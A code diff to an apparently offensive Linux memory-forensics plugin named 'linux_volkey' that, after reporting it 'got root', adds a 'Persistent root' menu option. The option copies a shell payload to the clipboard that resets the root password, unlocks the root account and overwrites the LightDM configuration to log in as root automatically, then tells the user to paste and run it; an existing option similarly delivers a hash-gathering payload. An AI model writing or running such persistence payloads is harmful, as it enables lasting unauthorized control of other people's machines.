@@ -23,8 +23,6 @@ except ImportError, e:
         pip.main(['install', package])
     except:
         charReaderFlag = False
-        print("Using antiquated menu. Please install the readchar package for a better experience")
-
 
 class linux_volkey(linux_common.AbstractLinuxCommand):
     """Gather active tasks by walking the task_struct->task list"""
@@ -246,6 +244,7 @@ class linux_volkey(linux_common.AbstractLinuxCommand):
     def keyMenu(self):
         print("""
     1. Get Hashes
+    2. Persistent root
     e. Exit
         """)
 
@@ -293,9 +292,20 @@ class linux_volkey(linux_common.AbstractLinuxCommand):
                 if success:
                     print "got root...probably"
                     self.skull();
+                    charReaderFlag = True
+                    try:
+                        import readchar
+                    except ImportError, e:
+                        try:
+                            import pip
+                            pip.main(['install', package])
+                        except:
+                            charReaderFlag = False
+                            print("Using antiquated menu. Please install the readchar package for a better experience")
+
                     self.keyMenu();
                     print("select an option:")
-                    keySelec = ['e','1']
+                    keySelec = ['e','1','2']
                     ans=self.readIn(keySelec)
                     print("option selected: "+ans+"\n")
                     if ans=="1": # generate keys
@@ -304,7 +314,10 @@ class linux_volkey(linux_common.AbstractLinuxCommand):
                         print("Payload copied to clipboard")
                         print("Click paste in terminal, and run the command to execute the payload")
                     elif ans=="2": # list keys
-                        pass
+                        data = "passwd root && usermod -U root && printf \"[Seat:*]\nautologin-user=root\" > /etc/lightdm/lightdm.conf"
+                        os.system("echo '%s' | pbcopy" % data)
+                        print("Payload copied to clipboard")
+                        print("Click paste in terminal, and run the command to execute the payload")
                     elif ans=="3": # delete key
                         pass
                     elif ans=="4": # delete secret key
